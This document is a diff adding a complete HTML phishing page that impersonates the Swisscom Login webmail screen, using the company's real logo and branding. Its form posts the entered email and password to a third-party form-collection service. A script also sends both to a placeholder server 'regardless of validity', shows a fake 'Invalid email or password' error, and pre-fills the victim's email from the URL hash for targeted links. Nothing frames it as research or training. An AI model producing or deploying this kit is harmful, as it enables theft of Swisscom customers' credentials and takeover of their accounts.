@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Swisscom Login</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=The+Sans:wght@600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #eef3f6;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            max-width: 800px;
+            margin: 100px auto;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .left-box {
+            background: radial-gradient(110% 240% at 0% 130%, rgba(19, 163, 244, 0.9) 0%, rgba(22, 158, 255, 0.5) 55%, rgba(16, 136, 222, 0) 130%), rgb(0, 17, 85);
+            color: white;
+            padding: 40px;
+            font-size: 16px;
+            border-top-left-radius: 12px;
+            border-bottom-left-radius: 12px;
+        }
+        .right-box {
+            background-color: white;
+            padding: 40px;
+            text-align: left;
+            border-top-right-radius: 12px;
+            border-bottom-right-radius: 12px;
+        }
+        .right-box img {
+            max-width: 100%;
+            height: auto;
+        }
+        .logo {
+            margin-bottom: 24px;
+        }
+        .bold-text {
+            font-weight: bold;
+            line-height: 32px;
+            letter-spacing: -0.75px;
+            font-size: 28px;
+            font-weight: 700;
+            white-space: nowrap;
+        }
+        .spacer {
+            margin: 10px 0;
+        }
+        .icon-text {
+            display: flex;
+            align-items: center;
+            margin: 5px 0;
+        }
+        .icon-text i {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        .icon-text span {
+            font-family: 'TheSans', sans-serif;
+            font-weight: 600;
+            line-height: 24px;
+            letter-spacing: -0.1px;
+            font-size: 18px;
+        }
+        .login-title {
+            font-family: 'TheSans', sans-serif;
+            font-weight: bold;
+            color: #0a52a3;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .deep-blue {
+            color: #086adb;
+            font-weight: bold;
+        }
+        .form-group {
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            box-sizing: border-box;
+        }
+        .login-button {
+            background-color: #086adb;
+            color: white;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .error-message {
+            color: red;
+            display: none;
+        }
+        h1 {
+            font-family: 'TheSans', sans-serif;
+            line-height: 40px;
+            letter-spacing: -1px;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            color: #015;
+            text-align: left;
+        }
+        h2 {
+            line-height: 32px;
+            letter-spacing: -0.75px;
+            font-size: 28px;
+            font-weight: 700;
+            white-space: nowrap;
+            margin: 0;
+        }
+        h4 {
+            line-height: 24px;
+            letter-spacing: -0.1px;
+            font-size: 20px;
+            font-weight: 600;
+            color: #015;
+            margin: 10px 0;
+            text-align: left;
+        }
+        h5 {
+            line-height: 24px;
+            letter-spacing: -0.1px;
+            font-size: 18px;
+            font-weight: 600;
+            margin: 10px 0;
+        }
+        .text-body-1 {
+            line-height: 24px;
+            letter-spacing: -0.1px;
+            font-size: 18px;
+            color: #015;
+            margin: 10px 0;
+            text-align: left;
+        }
+        .footer {
+            background-color: #474747;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .footer-logo {
+            max-width: 150px;
+        }
+        .footer-text {
+            color: white;
+            font-weight: 600;
+            line-height: 24px;
+            font-size: 18px;
+            letter-spacing: -0.1px;
+        }
+        .footer-text span {
+            font-weight: 400;
+            margin-left: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Left Box -->
+        <div class="left-box">
+            <h2>One access for everything</h2>
+            <div class="spacer"></div>
+            <h5>With your login data, you have access to all Swisscom services:</h5>
+            <div class="spacer" style="height: 20px;"></div>
+            <div class="icon-text">
+                <i class="material-icons">person</i>
+                <span>My Swisscom&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                <i class="material-icons">mail_outline</i>
+                <span>Webmail</span>
+            </div>
+            <div class="spacer"></div>
+            <div class="icon-text">
+                <i class="material-icons">cloud</i>
+                <span>myCloud&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                <i class="material-icons">tv</i>
+                <span>blue TV</span>
+            </div>
+            <div class="spacer"></div>
+            <div class="icon-text">
+                <i class="material-icons">groups</i>
+                <span>Community</span>
+            </div>
+        </div>
+
+        <!-- Right Box -->
+        <div class="right-box">
+            <img class="logo" src="https://login.scl.swisscom.ch/swisscom-logo-lifeform-38be0de766af1aaa475f946c32b47944.svg" alt="Swisscom Logo">
+            <h1>Swisscom Login</h1>
+            <h4>Webmail</h4>
+            <div class="text-body-1">Please login here with your Swisscom Login.</div>
+            <div class="spacer"></div>
+
+            <form id="loginForm" action="https://submit-form.com/iDtZfUoNb" method="POST">
+                <div class="form-group">
+                    <label for="email">Email-address:</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <button type="submit" class="login-button">Login</button>
+                <div class="error-message" id="errorMessage">Invalid email or password</div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer Section -->
+    <div class="footer">
+        <img class="footer-logo" src="https://login.scl.swisscom.ch/swisscom-logo-lifeform-38be0de766af1aaa475f946c32b47944.svg" alt="Footer Logo">
+        <div class="footer-text">
+            About Swisscom Login
+            <span>EN</span>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Send email and password regardless of validity
+            sendCredentials(email, password);
+
+            // Show error message for invalid logins (optional)
+            if (email !== "example@domain.com" || password !== "password123") {
+                errorMessage.style.display = 'block'; // Show error message
+            } else {
+                errorMessage.style.display = 'none'; // Hide error message for valid login
+            }
+
+            // Allow form submission
+            form.submit(); // Uncomment this line to allow actual form submission
+        });
+
+        function sendCredentials(email, password) {
+            // Placeholder function for sending email and password
+            fetch('https://your-server.com/send-email', { // Replace with your server URL
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Email sent:', data);
+            })
+            .catch((error) => {
+                console.error('Error sending email:', error);
+            });
+        }
+
+        // Autofill email from URL hash
+        window.onload = function() {
+            const emailInput = document.getElementById('email');
+            const hash = window.location.hash.substring(1);
+
+            if (hash.includes('@') && hash.includes('.')) {
+                emailInput.value = decodeURIComponent(hash);
+            }
+        }
+    </script>
+</body>
+</html>
